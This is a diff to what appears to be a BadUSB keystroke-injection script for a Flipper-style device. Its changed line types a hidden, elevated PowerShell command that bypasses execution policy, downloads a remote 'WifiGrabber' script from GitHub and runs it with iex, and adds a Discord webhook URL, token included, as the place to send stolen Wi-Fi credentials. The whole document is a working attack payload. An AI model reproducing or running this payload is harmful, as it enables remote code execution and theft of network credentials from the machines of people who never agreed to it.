@@ -1,6 +1,6 @@
 GUI r
 DELAY 500
-STRING powershell -Command "Start-Process powershell -ArgumentList '-NoP -Ep Bypass -Command `"irm https://raw.githubusercontent.com/Timmm27/BadUSB-Flipper-Jakoby/refs/heads/main/Wifi-Grabber/WifiGrabber.ps1 | iex`"' -Verb RunAs"
+STRING powershell -w h -NoP -Ep Bypass -Command "Start-Process powershell -ArgumentList '-w h -NoP -Ep Bypass $dc=''https://discord.com/api/webhooks/1262881667228500030/DL8QXiRzV9FA_ogQcmWdbFOz0oshAEPG94soYeC9IEQe4tCsvyTg73zC0Cz2qF4av4Ky''; $db=''; irm https://raw.githubusercontent.com/Timmm27/BadUSB-Flipper-Jakoby/refs/heads/main/Wifi-Grabber/WifiGrabber.ps1 | iex' -Verb RunAs"
 DELAY 1000
 ENTER
 DELAY 2000
